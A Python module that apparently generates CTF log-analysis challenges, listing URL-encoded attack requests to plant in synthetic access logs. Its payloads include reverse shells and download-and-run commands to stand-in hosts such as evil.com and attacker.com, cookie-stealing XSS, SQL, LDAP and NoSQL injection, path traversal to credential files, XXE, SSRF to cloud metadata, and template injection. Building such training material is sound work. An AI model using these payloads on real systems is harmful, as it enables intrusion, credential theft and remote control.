"""
Common Attack Payloads for CTF Log Generation
URL-encoded versions ready to be inserted into access logs
"""

# Command Injection / RCE Payloads
COMMAND_INJECTION = [
    # Bash reverse shells
    "/api/exec?cmd=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.0.1%2F4444%200%3E%261",
    "/upload?file=;nc%20-e%20/bin/sh%20attacker.com%204444",
    "/search?q=test;curl%20http://evil.com/shell.sh|bash",
    
    # PHP execution
    "/apps/cart.jsp?cmd=export%20CMD%3D%22%2Fbin%2Fsh%22%3B%20php%20-r%20%27passthru%28getenv%28%22CMD%22%29%29%3B%27",
    "/admin.php?cmd=php%20-r%20%27system%28%24_GET%5Bc%5D%29%3B%27&c=whoami",
    "/upload.php?file=<?php%20system($_GET[%27cmd%27]);%20?>",
    
    # Python reverse shell
    "/api/run?code=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22attacker.com%22,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([%22/bin/sh%22,%22-i%22])%27",
    
    # Netcat variants
    "/exec?cmd=rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/sh%20-i%202>&1|nc%2010.0.0.1%204444%20>/tmp/f",
    
    # Wget/Curl download and execute
    "/api?cmd=wget%20http://evil.com/malware.sh%20-O%20/tmp/m.sh%20&&%20chmod%20+x%20/tmp/m.sh%20&&%20/tmp/m.sh",
]

# SQL Injection Payloads
SQL_INJECTION = [
    # Authentication bypass
    "/login?username=admin%27%20OR%20%271%27=%271&password=anything",
    "/auth?user=admin%27--&pass=test",
    "/api/user?id=1%27%20OR%201=1--",
    
    # UNION-based injection
    "/products?id=1%27%20UNION%20SELECT%20null,username,password,null%20FROM%20users--",
    "/search?q=test%27%20UNION%20SELECT%201,2,3,group_concat(table_name)%20FROM%20information_schema.tables--",
    
    # Blind SQL injection
    "/article?id=1%27%20AND%20(SELECT%20COUNT(*)%20FROM%20users)>0--",
    "/user?id=1%27%20AND%20SLEEP(5)--",
    
    # Stacked queries
    "/delete?id=1;%20DROP%20TABLE%20users;--",
]

# Path Traversal / LFI / RFI
PATH_TRAVERSAL = [
    # Directory traversal
    "/download?file=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
    "/read?path=....//....//....//etc/passwd",
    "/view?page=../../../../../../etc/shadow",
    "/api/file?name=..\\..\\..\\..\\windows\\system32\\config\\sam",
    
    # Log poisoning
    "/include?file=../../../../../../var/log/apache2/access.log&cmd=<?php%20system($_GET[%27c%27]);%20?>",
    
    # PHP wrappers
    "/index.php?page=php://filter/convert.base64-encode/resource=config.php",
    "/page?file=php://input",
    "/load?url=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
    
    # Remote file inclusion
    "/include?file=http://evil.com/shell.txt",
]

# XSS Payloads
XSS = [
    # Stored XSS
    "/comment?text=<script>document.location=%27http://evil.com?c=%27+document.cookie</script>",
    "/post?content=<img%20src=x%20onerror=alert(document.cookie)>",
    
    # Reflected XSS
    "/search?q=<script>fetch(%27http://attacker.com?cookie=%27+document.cookie)</script>",
    "/error?msg=<svg/onload=alert(1)>",
    
    # DOM-based XSS
    "/page?name=<iframe%20src=javascript:alert(document.domain)>",
]

# XXE (XML External Entity)
XXE = [
    "/api/xml?data=<!DOCTYPE%20foo%20[<!ENTITY%20xxe%20SYSTEM%20%22file:///etc/passwd%22>]><root>&xxe;</root>",
    "/upload?xml=<!DOCTYPE%20test%20[<!ENTITY%20xxe%20SYSTEM%20%22http://internal-server/secret%22>]><data>&xxe;</data>",
]

# SSRF (Server-Side Request Forgery)
SSRF = [
    "/fetch?url=http://localhost:8080/admin",
    "/proxy?target=http://169.254.169.254/latest/meta-data/",
    "/api/webhook?callback=http://internal-service:6379/",
]

# Template Injection
TEMPLATE_INJECTION = [
    # SSTI (Server-Side Template Injection)
    "/render?name={{7*7}}",
    "/page?template={{config.__class__.__init__.__globals__[%27os%27].popen(%27id%27).read()}}",
    "/greet?msg=${7*7}",
]

# Deserialization
DESERIALIZATION = [
    "/api/load?data=O:8:%22UserAuth%22:1:{s:8:%22isAdmin%22;b:1;}",
    "/session?token=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAN3CAAAAARzAAR0ZXN0",
]

# NoSQL Injection
NOSQL_INJECTION = [
    "/login?user[$ne]=null&pass[$ne]=null",
    "/api/user?id[$gt]=",
    "/search?filter={%22$where%22:%22this.password.match(/.*/)%22}",
]

# LDAP Injection
LDAP_INJECTION = [
    "/auth?user=admin)(&))&pass=test",
    "/search?name=*)(uid=*))(|(uid=*",
]

# Command Injection (OS-specific)
OS_COMMAND_INJECTION = [
    # Linux/Unix
    "/ping?host=127.0.0.1;cat%20/etc/passwd",
    "/traceroute?ip=8.8.8.8|whoami",
    "/nslookup?domain=google.com`id`",
    
    # Windows
    "/cmd?exec=dir%20|%20type%20C:\\windows\\system32\\drivers\\etc\\hosts",
    "/run?cmd=ping%20127.0.0.1%20%26%26%20net%20user",
]

# JWT/Authentication Bypass
AUTH_BYPASS = [
    "/api/admin?jwt=eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
    "/protected?token=../../../etc/passwd",
]


# Helper function to pick random payloads
def get_random_malicious_entries(count=5):
    """Get random malicious payloads from all categories"""
    import random
    
    all_payloads = (
        COMMAND_INJECTION + SQL_INJECTION + PATH_TRAVERSAL + 
        XSS + XXE + SSRF + TEMPLATE_INJECTION + 
        DESERIALIZATION + NOSQL_INJECTION + LDAP_INJECTION +
        OS_COMMAND_INJECTION + AUTH_BYPASS
    )
    
    selected = random.sample(all_payloads, min(count, len(all_payloads)))
    
    return [{'position': None, 'payload': p} for p in selected]


if __name__ == "__main__":
    # Example: Generate log with random attacks
    from generate_logs import generate_logs
    
    malicious = get_random_malicious_entries(count=3)
    
    print("Generating log with these payloads:")
    for i, entry in enumerate(malicious, 1):
        print(f"{i}. {entry['payload'][:80]}...")
    
    generate_logs(
        output_file="multi_attack_challenge.log",
        num_entries=50000,
        malicious_entries=malicious,
        random_positions=True
    )

